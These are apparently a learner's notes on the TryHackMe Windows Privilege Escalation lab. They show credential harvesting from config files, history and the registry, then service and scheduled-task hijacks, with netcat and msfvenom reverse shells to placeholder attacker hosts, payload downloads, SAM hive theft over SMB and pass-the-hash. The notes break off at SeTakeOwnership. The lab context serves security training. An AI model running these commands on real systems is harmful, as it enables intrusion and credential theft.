# TRYHACKME : Windows Privilege Escalation

> Gaining access to different accounts can be as simple as finding credentials in text files or spreadsheets left unsecured by some careless user, but that won't always be the case. Depending on the situation, we might need to abuse some of the following weaknesses:
> - Misconfigurations on Windows services or scheduled tasks
> - Excessive privileges assigned to our account
> - Vulnerable software
> - Missing Windows security patches

## Windows User
| User Type | Privileges |
|---|---|
| Administrator | -> have the most privileges -> can change any system configuration parameter & access any file in the system |
| Standard Users | -> can access the computer but only perform limited tasks -> these users can not make permanent or essential changes to the system and are limited to their files |

| Special Built-in Accounts | |
|---|---|
| SYSTEM / LocalSystem | -> account used by the operating system to perform internal tasks -> has full access to all files and resources available on the host -> has higher privileges than administrators |
| Local Service | -> default account -> minimum privileges -> uses anonymous connections over the network |
| Network Service | -> default account -> minimum privileges -> use the computer credentials to authenticate through the network |

<details markdown=1>
<summary><h2> 1. Harvesting Passwords from Usual Spots </h2></summary>
  
> This task will present some known places to look for passwords on a Windows system.
>
> Start the target machine. If using 
>
>> Username: `thm-unpriv` Password: `Password321`
>
> # A. Unattended Windows Installations
> When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network.
> 
>> These kinds of installations are referred to as unattended installations as they don't require user interaction.
>
> Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
>```
>    C:\Unattend.xml
>    C:\Windows\Panther\Unattend.xml
>    C:\Windows\Panther\Unattend\Unattend.xml
>    C:\Windows\system32\sysprep.inf
>    C:\Windows\system32\sysprep\sysprep.xml
> ```
>
> In these type of files, you might encounter credentials such as:
> ```
>  <Credentials>
>     <Username>Administrator</Username>
>     <Domain>thm.local</Domain>
>     <Password>MyPassword123</Password>
>  </Credentials>
> ```
> ## TARGET MACHINE:
>> ```
>> more C:\Unattend.xml => (cannot access file / file not found)
>> more C:\Windows\Panther\Unattend.xml => (cannot access file / file not found)
>> dir C:\Windows\Panther\Unattend => (empty folder)
>> more C:\Windows\system32\sysprep.inf => (cannot access file / file not found)
>> dir C:\Windows\system32\sysprep
>>       <DIR> ActionFiles
>>       <DIR> en-us
>>       <DIR> Panther
>>       sysprep.exe
>> more C:\Windows\system32\sysprep\sysprep.xml => (cannot access file / file not found)
>> ```
>> 
> 
> # B. Powershell History
> All commands run using Powershell gets stored into a file that keeps a memory of past commands.
>
>> It can later be retrieved by using the following command from a `cmd.exe` prompt (it won't work in Powershell; in order to read the file from Powershell, replace `%userprofile%` into `$Env:userprofile`)
>
> ```
> type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
>> ls
>> whoami
>> whoami /priv
>> whoami /group
>> whoami /groups
>> cmdkey /?
>> cmdkey /add:thmdc.local /user:julia.jones /pass:ZuperCkretPa5z        // WAHH CREDENTIALS!!!
>> cmdkey /list
>> cmdkey /delete:thmdc.local
>> cmdkey /list
>> runas /?
>> ```
>
> # C. Saved Windows Credentials
> Windows allows us to use other users' credentials.
>
> The command below will list saved credentials:
> ```
> cmdkey /list
> ```
>
> Regardless of not seeing actual passwords, credentials alone are worth trying. Use them with the `runas` command and the `/savecrad` option:
> ```
> runas /savecred /user:admin cmd.exe
> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>cmdkey /list
>>
>> Currently stored credentials:
>>
>>     Target: Domain:interactive=WPRIVESC1\mike.katz
>>     Type: Domain Password
>>     User: WPRIVESC1\mike.katz
>> 
>> C:\Users\thm-unpriv>runas /savecred /user:mike.katz cmd.exe
>> Attempting to start cmd.exe as user "WPRIVESC1\mike.katz" ...
>>
>> (opens another cmd terminal)
>>
>> C:\Windows\system32>whoami
>> wprivesc1\mike.katz
>> C:\Windows\system32>more C:\Users\mike.katz\Desktop\flag.txt
>> // FLAG ANSWER
>> ```
>
> # D. IIS Configuration
> Internet Information Services (IIS) is the default web server on Windows installations.
>
>> IIS websites' configuration is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms.
>
> Depending on the installed version, `web.config` can be found on ff locations:
>``` 
>    C:\inetpub\wwwroot\web.config
>    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
>```
> 
> To quickly find database connection strings on the file:
> ```
> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
> ```
> ## TARGET MACHINE
>> ```
>> C:\Users\thm-unpriv> more C:\inetpub\wwwroot\web.config => (cannot access file / file not found)
>> C:\Users\thm-unpriv> type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
>>                 <add connectionStringName="LocalSqlServer" maxEventDetailsLength="1073741823" buffer="false"
>> bufferMode="Notification" name="SqlWebEventProvider"
>> type="System.Web.Management.SqlWebEventProvider,System.Web,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a" />
>>                     <add connectionStringName="LocalSqlServer" name="AspNetSqlPersonalizationProvider"
>> type="System.Web.UI.WebControls.WebParts.SqlPersonalizationProvider, System.Web, Version=4.0.0.0, Culture=neutral,
>> PublicKeyToken=b03f5f7f11d50a3a" />
>>     <connectionStrings>
>>         <add connectionString="Server=thm-db.local;Database=thm-sekure;User ID=db_admin;Password=098n0x35skjD3" name="THM-DB" />  // WAHH CREDENTIALS !!!
>> </connectionStrings>
>> ```
>
> # E. Retrieve Credentials from Software: PuTTY
> **PuTTY** is an SSH client commonly found on Windows systems. It is created by Simon Tatham (his name is part of the path, not the username to retrieve password).
>
> Users can store sessions (IP, user, and other configurations) instead of having to specify a connection's parameters every single time. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
>
> To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword w/ the ff command:
> ```
> reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
> ```
> Stored proxy username should also be visible after running the command above.
>
> # TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
>> HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server
>> 
>>     ProxyExcludeList    REG_SZ
>>     ProxyDNS    REG_DWORD    0x1
>>     ProxyLocalhost    REG_DWORD    0x0
>>     ProxyMethod    REG_DWORD    0x0
>>     ProxyHost    REG_SZ    proxy
>>     ProxyPort    REG_DWORD    0x50
>>     ProxyUsername    REG_SZ    thom.smith
>>     ProxyPassword    REG_SZ    CoolPass2021    // WAHH CREDENTIALS !!!
>>     ProxyTelnetCommand    REG_SZ    connect %host %port\n
>>     ProxyLogToTerm    REG_DWORD    0x1
>>
>> End of search: 10 match(es) found.
>> ```
>>
</details>

<details>
<summary><h2> 2. Other Quick Wins </h2></summary>
  
> Privilege escalation is not always a challenge.
>
> Some misconfigurations can allow you to obtain higher privileged user access and, in some cases, even administrator access.
>
> # A. Scheduled Tasks
> Some scheduled task might either lost its binary or it's using a binary you can modify.
>
> Scheduled tasks can be listed from the command line using the `schtasks` command without any options.
>
> To retrieve more detailed information about any of the services you can type
> ```
> C:\> schtasks /query /tn vulntask /fo list /v
> Folder: \
> HostName:                             THM-PC1
> TaskName:                             \vulntask
> Task To Run:                          C:\tasks\schtask.bat
> Run As User:                          taskusr1
> ```
> ### Two Important Parameters:
>> - **Task to Run** = indicates what gets executed by the scheduled task
>> - **Run As User** = shows the user that will be used to execute the task
>
> If modifiable, we can control what gets executed by the taskuser1, resulting in a simple privilege escalation.
> 
> Use `icacls` to check permissions on the executable:
> ```
> C:\> icacls c:\tasks\schtask.bat
> c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
>                     BUILTIN\Administrators:(I)(F)
>                     BUILTIN\Users:(I)(F)
> ```
> The **BUILTIN/Users** group has full access (F) over the task's binary. That means we can modify the .bat file and insert any payloads we like.
>
> ## ATTACKER MACHINE:
>> ```
>> root@ip-10-10-107-180:~# nc -lvp 4444
>> ```
>
> ## TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>echo c:\tools\nc64.exe -e cmd.exe <ATTACKER-IP> 4444 > C:\tasks\schtask.bat
>>
>> C:\Users\thm-unpriv>schtasks /run /tn vulntask
>> SUCCESS: Attempted to run the scheduled task "vulntask".
>> ```
>
> ## ATTACKER MACHINE:
>> ```
>> root@ip-10-10-107-180:~# nc -lvp 4444
>> Listening on 0.0.0.0 4444
>> Connection received on 10.10.89.191 49907
>> Microsoft Windows [Version 10.0.17763.1821]
>> (c) 2018 Microsoft Corporation. All rights reserved.
>>
>> C:\Windows\system32>whoami
>> wprivesc1\taskusr1
>>
>> C:\Windows\system32>more C:\Users\taskuser1\Desktop\flag.txt
>> // RETRIEVE FLAG
>> ```
>
> # B. AlwaysInstallElevated
> Windows installer files (.msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it.
>
> However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
>
>> **NOTE:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.
> 
> This method required two registry values to be set. Otherwise, exploitation will not be possible. You can query these from the command line using the commands below:
>> ```
>> C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
>> C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
>> ```
>
> After setting the two, you can generate a malicious .msi file using `msfvenom`, as seen below:
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
> ```
> As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
> ```
> C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
> ```
  
</details>

<details> 
<summary><h2> 3. Abusing Service Misconfigurations </h2></summary>

> # A. Windows Services
> Window servies are managed by the **Service Control Manager (SCM)**. Its in charge of managing the state of service as needed, checking the current status of any given service and generally providing a way to configure services.
> 
>> Each service will have associated executable which will be run by SCM whenever a service is started.
>
> Service executables implement _special functions_ to be able to communicate with the SCM. Therefore, not any executable can be started as a service succesfully.
>
>> Each service also specifies the **user account** under which the service will run.
>
> To check the structure of a service, let's check as an example the `apphostsvc` service configuration with the `sc qc` command:
> 
> ### TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>sc qc apphostsvc
>> [SC] QueryServiceConfig SUCCESS
>>
>> SERVICE_NAME: apphostsvc
>>         TYPE               : 20  WIN32_SHARE_PROCESS\
>>         START_TYPE         : 2   AUTO_START
>>         ERROR_CONTROL      : 1   NORMAL
>>         BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
>>         LOAD_ORDER_GROUP   :        TAG                : 0
>>         DISPLAY_NAME       : Application Host Helper Service
>>         DEPENDENCIES       :
>>         SERVICE_START_NAME : localSystem
>> ```
> Here we can see the _associated executable_ is specified throught the **BINARY_PATH_NAME** parameter, and the _account used_ to urn the service is shown on the **SERVICE_START_NAME** parameter.
>
>> Services have a **Discretionary Access Control List (DACL)**, which indicates _who has permission_ to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
>
> DACL can be seen from **Process Hacker** on THM's target machine's desktop. Then click on Services Tab > AppHOstSvc > Security Tab. You'll see the group or user names and their permissions.
>
> While all the services configuration are stored on the **Registry Editor** under `HKLM\SYSTEM\CurrentControlSet\Services\AppHostSvc`
>
>> A **subkey** exist for every service in the system. We can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**.
>
> # B. Insecure Permissions on Service Executable
>
> If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.
>
> To understand how this works, let's look at a vulnerability found on **Splinterware System Scheduler**. To start, we will query the service configuration using sc:
>
> ### TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>sc qc WindowsScheduler
>> [SC] QueryServiceConfig SUCCESS
>>
>> SERVICE_NAME: WindowsScheduler
>>         TYPE               : 10  WIN32_OWN_PROCESS
>>         START_TYPE         : 2   AUTO_START
>>         ERROR_CONTROL      : 0   IGNORE
>>         BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
>>         LOAD_ORDER_GROUP   :
>>         TAG                : 0
>>         DISPLAY_NAME       : System Scheduler Service
>>         DEPENDENCIES       :
>>         SERVICE_START_NAME : .\svcusr1
>> ```
 
> We can see that the service installed by the vulnerable software runs as **svcuser1** and the executable associated with the service is in `C:\Progra~2\System~1\WService.exe`. We then proceed to check the permissions on the executable:
>
> ### TARGET MACHINE:
>> ```
>> C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
>> C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
>>                                   NT AUTHORITY\SYSTEM:(I)(F)
>>                                   BUILTIN\Administrators:(I)(F)
>>                                   BUILTIN\Users:(I)(RX)
>>                                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
>>                                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
>>
>> Successfully processed 1 files; Failed processing 0 files
>> ```
> And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. **This means we can simply overwrite it with any payload of our preference**, and the service will execute it with the privileges of the configured user account.
>
> ### ATTACKER MACHINE:
>> ```
>> user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
>>
>> user@attackerpc$ python3 -m http.server 8000
>> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
>> ```
>
> We can then pull the payload from Powershell with the following command:
> ### TARGET MACHINE:
>> ```
>> wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
>> ```
>
> Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
>
> ### TARGET MACHINE:
>> ```
>> C:\> cd C:\PROGRA~2\SYSTEM~1\
>>
>> C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
>>         1 file(s) moved.
>>
>> C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
>>         1 file(s) moved.
>>
>> C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
>>         Successfully processed 1 files.
>> ```
>
> We start a reverse listener on our attack machine:
> ### ATTACKER MACHINE:
>> ```
>> user@attackerpc$ nc -lvp 4445 // OR socat TCP-L:4445 
>> ```
>
> And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
>
> ### TARGET MACHINE:
>> ```
>> C:\> sc stop windowsscheduler
>> C:\> sc start windowsscheduler
>> ```
> > Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.
>
> As a result, you'll get a reverse shell with svcusr1 privileges
> 
> ### ATTACKER MACHINE:
>> ```
>> user@attackerpc$ nc -lvp 4445
>> Listening on 0.0.0.0 4445
>> Connection received on 10.10.175.90 50649
>> Microsoft Windows [Version 10.0.17763.1821]
>> (c) 2018 Microsoft Corporation. All rights reserved.
>>
>> C:\Windows\system32>whoami
>> wprivesc1\svcusr1
>> 
>> C:\Windows\system32> more C:\Users\svcusr1\Desktop\flag.txt
>> // RETRIVE FLAG
>> ```
>
> # C. Unquoted Service Paths
> When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
>
> When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
>
> This simply shows a syntax error in the **BINARY_PATH_NAME**. When a path is not surrounded by double quotation marks, it is not properly configured as there are spaces on the name of the path of the specific service folder. The command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute.
>
> The command prompt will mistakenly interpret the first line as an executable file and the rest, after the space, is taken as arguments.
>
> **Compare:**
> ```
> BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
> ```
> ```
> BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
> ```
>
> From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.
>
> While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.
>
> In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
>
> # TARGET MACHINE:
>> ```
>> C:\>icacls c:\MyPrograms
>> c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
>>               BUILTIN\Administrators:(I)(OI)(CI)(F)
>>               BUILTIN\Users:(I)(OI)(CI)(RX)
>>               BUILTIN\Users:(I)(CI)(AD)
>>               BUILTIN\Users:(I)(CI)(WD)
>>               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
>>
>> Successfully processed 1 files; Failed processing 0 file
>> ```
>
> The BUILTIN\\Users group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.
>
> # ATTACKER MACHINE:
>> ```
>> user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
>> 
>> user@attackerpc$ python3 -m http.server 8000
>> Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
>> ```
>
> # TARGET MACHINE (POWERSHELL):
>> ```
>> wget http://ATTACKER_IP:8000/rev-svc2.exe -O rev-svc2.exe
>> ```
>
> # ATTACKER MACHINE:
>> ```
>> nc -lvnp 4446 // OR socat TCP-L:4446 -
>> ```
>
>  Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to **C:\MyPrograms\Disk.exe**. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
>
> # TARGET MACHINE:
>> ```
>> C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
>>
>> C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
>>         Successfully processed 1 files.
>> 
>> C:\> sc stop "disk sorter enterprise"
>>
>> C:\> sc start "disk sorter enterprise"
>> ```
>
> # ATTACKER MACHINE:
>> ```
>> user@attackerpc$ nc -lvp 4446
>> Listening on 0.0.0.0 4446
>> connection received on 10.10.175.90 50650
>> Microsoft Windows [Version 10.0.17763.1821]
>> (c) 2018 Microsoft Corporation. All rights reserved.
>>
>> C:\Windows\system32>whoami
>> wprivesc1\svcusr2
>>
>> C:\Windows\system32>more C:\Users\svcusr2\Desktop\flag.txt
>> more C:\Users\svcusr2\Desktop\flag.txt
>> // RETRIEVE FLAG
>> ```

> # D. Insecure Service Permissions
> You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted.
>
> Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
>
> To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
>
> # TARGET MACHINE:
>> ```
>> C:\>cd C:\tools\AccessChk && accesschk64.exe -qlc thmservice
>> 
>> Accesschk v6.14 - Reports effective permissions for securable objects
>> Copyright ⌐ 2006-2021 Mark Russinovich
>> Sysinternals - www.sysinternals.com
>>
>> thmservice
>>   DESCRIPTOR FLAGS:
>>       [SE_DACL_PRESENT]
>>       [SE_SACL_PRESENT]
>>       [SE_SELF_RELATIVE]
>>   OWNER: NT AUTHORITY\SYSTEM
>>   [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
>>         SERVICE_QUERY_STATUS
>>         SERVICE_QUERY_CONFIG
>>         SERVICE_INTERROGATE
>>         SERVICE_ENUMERATE_DEPENDENTS
>>         SERVICE_PAUSE_CONTINUE
>>         SERVICE_START
>>         SERVICE_STOP
>>         SERVICE_USER_DEFINED_CONTROL
>>         READ_CONTROL
>>   [1] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Administrators  // TAKE NOTE
>>         SERVICE_ALL_ACCESS
>> ```
> Here we can see that the **BUILTIN\\Users** group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.
>
> Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
>
> # ATTACKER MACHINE:
>> ```
>> user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
>>
>> user@attackerpc$ python3 -m http.server 9000
>> Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
>> ```
> 
> # TARGET MACHINE (POWERSHELL):
>> ```
>> wget http://10.4.124.80:9000/rev-svc3.exe -O rev-svc3.exe
>> ```
>
> # TARGET MACHINE (POWERSHELL):
>> ```
>> C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
>>
>> C:\>sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
>> [SC] ChangeServiceConfig SUCCESS
>>
>> C:\>sc stop THMService
>> [SC] ControlService FAILED 1062:
>>
>> The service has not been started.
>>
>> C:\>sc start THMService
>>
>> SERVICE_NAME: THMService
>>         TYPE               : 10  WIN32_OWN_PROCESS
>>         STATE              : 4  RUNNING
>>                                 (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
>>         WIN32_EXIT_CODE    : 0  (0x0)
>>         SERVICE_EXIT_CODE  : 0  (0x0)
>>         CHECKPOINT         : 0x0
>>         WAIT_HINT          : 0x0
>>         PID                : 2884
>>         FLAGS              :
>> ```
>
> # ATTACKER MACHINE:
>> ```
>> $ socat TCP-L:4447 -
>> Microsoft Windows [Version 10.0.17763.1821]
>> (c) 2018 Microsoft Corporation. All rights reserved.
>>
>> C:\Windows\system32>whoami
>> NT AUTHORITY\SYSTEM
>>
>> C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
>> more C:\Users\Administrator\Desktop\flag.txt
>> // RETRIEVE FLAG
>> ```

</details>

<details>
<summary><h2> 4. Abusing Dangerous Privileges </h2></summary>

> # A. Windows Privileges
> Each user has a set of privileges that can be checked with the following command:
>> ```
>> whoami /priv
>> ```
>
> A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.
>
> While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.
>
> # B. SeBackup / SeRestore
> The **SeBackup** and **SeRestore** privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to _perform backups from a system without requiring full administrative privileges_.
>
> Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives **to extract the local Administrator's password hash**.
>
> Log in to the target machine via RDP using the following credentials:
> 
> User: `THMBackup` Password: `CopyMaster555`
>
>> Open command prompt as administrator. Check the account privileges with the ff command:
>
> ### TARGET MACHINE:
>> ```
>> C:\> whoami /priv
>>
>> PRIVILEGES INFORMATION
>> ----------------------
>>
>> Privilege Name                Description                    State
>> ============================= ============================== ========
>> SeBackupPrivilege             Back up files and directories  Disabled
>> SeRestorePrivilege            Restore files and directories  Disabled
>> SeShutdownPrivilege           Shut down the system           Disabled
>> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
>> SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
>> ```
>
>> To backup the SAM and SYSTEM hashes, we can use the ff. command:
>
> ### TARGET MACHINE:
>> ```
>> C:\> reg save hklm\system C:\Users\THMBackup\system.hive
>> The operation completed successfully.
>>
>> C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
>> The operation completed successfully.
>> ```
>
> This creates duplicate files with the registry hives content.
>
> We can now copy these files to our attacker machine using SMB or any other available method.
>
> ### ATTACKER MACHINE:
>> ```
>> user@attackerpc$ mkdir share
>> user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share 
>>
>> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
>> [*] Config file parsed
>> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
>> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
>> [*] Config file parsed
>> ```
>>> IF PYTHON 3.9 DOESNT WORK TO YOU OR if folders from the example can't be found, look for the file dir path:
>>> ```
>>> find / -type f -name "smbserver.py" 2>/dev/null
>>> ```
> This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, use impacket to retrieve the users' password hashes:
> 
> ### TARGET MACHINE:
>> ```
>> C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
>> C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
>
> ### ATTACKER MACHINE:
>> ```
>> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
>>
>> [*] Config file parsed
>> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
>> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
>> [*] Config file parsed
>> [*] Config file parsed
>> [*] Incoming connection (10.10.8.143,49881)
>> [*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
>> [*] User WPRIVESC2\THMBackup authenticated successfully
>> [*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:2e1d19e8982a827d9c10a33cf2c4df23:010100000000000080af2eeef193db010627d4ce767c439500000000010010006300780052005200690072004500610003001000630078005200520069007200450061000200100067004700560076005500620055006a000400100067004700560076005500620055006a000700080080af2eeef193db010600040002000000080030003000000000000000000000000030000046636b1266546c840d57fc859740047f5562371c3529f221463ce045cc00aa270a001000000000000000000000000000000000000900200063006900660073002f00310030002e0034002e003100320034002e00380030000000000000000000
>> [*] Connecting Share(1:IPC$)
>> [*] Connecting Share(2:public)
>> [*] Disconnecting Share(1:IPC$)
>> [*] Disconnecting Share(2:public)
>> [*] Closing down connection (10.10.8.143,49881)
>> [*] Remaining connections []
>> [*] Incoming connection (10.10.8.143,49887)
>> [*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
>> [*] User WPRIVESC2\THMBackup authenticated successfully
>> [*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:ddda436b4b94a94b91d2649b99f5ae95:0101000000000000004bba32f293db01030e61cff7f1225b00000000010010006300780052005200690072004500610003001000630078005200520069007200450061000200100067004700560076005500620055006a000400100067004700560076005500620055006a0007000800004bba32f293db010600040002000000080030003000000000000000000000000030000046636b1266546c840d57fc859740047f5562371c3529f221463ce045cc00aa270a001000000000000000000000000000000000000900200063006900660073002f00310030002e0034002e003100320034002e00380030000000000000000000
>> [*] Connecting Share(1:public)
>> ```
> We can finally use the Administrator's hash to perform a **Pass-the-Hash attack** and gain access to the target machine with SYSTEM privileges:
> 
> ### ATTACKER MACHINE:
>> ```
>> user@attackerpc$ cd share  // if not in the share dir yet
>> user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
>> Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
>>
>> [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
>> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
>> Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
>> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
>>
>> user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.8.143
>> Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
>>
>> [*] Requesting shares on 10.10.175.90.....
>> [*] Found writable share ADMIN$
>> [*] Uploading file nfhtabqO.exe
>> [*] Opening SVCManager on 10.10.175.90.....
>> [*] Creating service RoLE on 10.10.175.90.....
>> [*] Starting service RoLE.....
>> [!] Press help for extra shell commands
>> Microsoft Windows [Version 10.0.17763.1821]
>> (c) 2018 Microsoft Corporation. All rights reserved.
>>
>> C:\Windows\system32> whoami
>> nt authority\system
>> ``` 
> 
> # C. SeTakeOwnership
> The **SeTakeOwnership** privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges.
>
> Log in to the target machine via RDP using the following credentials:
>
> User: `THMTakeOwnership` Password: `TheWorldIsMine2022`
>
> Open and run command prompt as the administrator.
>
